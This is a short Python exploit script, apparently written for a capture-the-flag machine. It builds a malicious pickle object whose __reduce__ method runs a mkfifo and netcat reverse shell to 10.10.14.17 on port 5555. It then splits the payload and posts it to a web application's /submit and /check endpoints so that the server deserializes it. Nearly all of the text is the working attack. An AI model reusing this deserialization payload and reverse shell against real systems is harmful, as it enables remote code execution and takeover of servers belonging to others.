import os
import cPickle
from hashlib import md5
import requests

 # Exploit that we want the target to unpickle

class Exploit(object):
	def __reduce__(self):
		return (os.system, (‘homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 5555 >/tmp/f’,))

shellcode = cPickle.dumps(Exploit())
print shellcode + “\n”
print md5(shellcode).hexdigest()

part1 = str(shellcode.split(“;”)[0])
part2 = str(“;”+shellcode.split(“;”)[1])
part3 = str(“;”+shellcode.split(“;”)[2])
part4 = str(“;”+shellcode.split(“;”)[3])

r = requests.post(“http://10.10.10.70/submit", data={‘character’: str(part1), ‘quote’:str(part2 + part3 + part4)})

print(r.status_code, r.reason, r.text)

r2 = requests.post(“http://10.10.10.70/check", data={‘id’: md5(shellcode).hexdigest()})

print(r2.status_code, r2.reason, r2.text)
